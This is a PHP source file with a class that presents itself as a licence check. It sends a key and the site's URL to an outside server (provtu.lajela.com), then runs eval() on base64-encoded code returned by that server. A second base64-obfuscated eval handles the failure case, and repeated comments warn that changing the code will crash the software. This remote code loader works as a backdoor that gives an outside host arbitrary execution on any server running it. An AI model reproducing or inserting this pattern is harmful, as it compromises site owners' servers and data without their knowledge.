  <?php  
    /*
    * IT IS HIGHLY RECOMMENDED THAT YOU SHOULD NOT ALTER THIS CODE; 
    * REMOVING OF THIS CODE WILL INTENTIONALLY CRASH THE SOFTWARE
    * BUT LEAVE THE DATABASE UNTOUCHED OUT OF PITY.
   */
     class execute{
         protected  $token;
         protected  $key;
                function __construct($key,$token) {
               $this->key = $key;
                $this->token = $token;
            } 
            function   prepare($id){
            $host = 'https://provtu.lajela.com/code';
            $requestID = time()+mt_rand();
            $refer= (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://{$_SERVER["HTTP_HOST"]}{$_SERVER["REQUEST_URI"]}";
            $data = array(
            'id' => "$id"
            );  
            $curl       = curl_init();
            curl_setopt_array($curl, array(
            CURLOPT_URL => $host,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_ENCODING => "",
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_REFERER => $refer,
             /*
            * IT IS HIGHLY RECOMMENDED THAT YOU SHOULD NOT ALTER THIS CODE; 
            * REMOVING OF THIS CODE WILL INTENTIONALLY CRASH THE SOFTWARE
            * BUT LEAVE THE DATABASE UNTOUCHED OUT OF PITY.
           */   
            CURLOPT_HTTPHEADER => array("Authorization: Bearer $this->key"),
            CURLOPT_FOLLOWLOCATION=> true,
            CURLOPT_MAXREDIRS => 10,   
            CURLOPT_POSTREDIR => 3,   
            CURLOPT_TIMEOUT => 30,
            /*
            * IT IS HIGHLY RECOMMENDED THAT YOU SHOULD NOT ALTER THIS CODE; 
            * REMOVING OF THIS CODE WILL INTENTIONALLY CRASH THE SOFTWARE
            * BUT LEAVE THE DATABASE UNTOUCHED OUT OF PITY.
           */
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => "POST",
            ));
             $r =  curl_exec($curl); 
            curl_close($curl);
            $r = json_decode($r,true);
            if(trim($r["token"])==trim($this->token)){
                eval("?>".base64_decode($r["code"]));
            }  else {
                eval(base64_decode("Jy4uL2luY2x1ZGUvaW5pX3NldC5waHAnOyBpbmNsdWRlICcuLi9pbmNsdWRlL2RhdGFfY29uZmlnLnBocCc7aW5jbHVkZSAnLi4vaW5jbHVkZS93ZWJjb25maWcucGhwJztpbmNsdWRlX29uY2UgIi4uL2xhbmd1YWdlL3skd2ViQ29uZmlnWyJMQU5HIl19LnBocCI7ICRvdXRwdXRbInRpdGxlIl09JEdMT0JBTFNbIkxBTkciXVsiZXJyb3JfaW5fbGljZW5jZXMiXTskb3V0cHV0WyJidXR0b24iXT0kR0xPQkFMU1siTEFORyJdWyJva2F5Il07JG91dHB1dFsiaWNvbiJdPSJlcnJvciI7ZWNobyBqc29uX2VuY29kZSgkb3V0cHV0KTs="));
            }
          }
     }
?>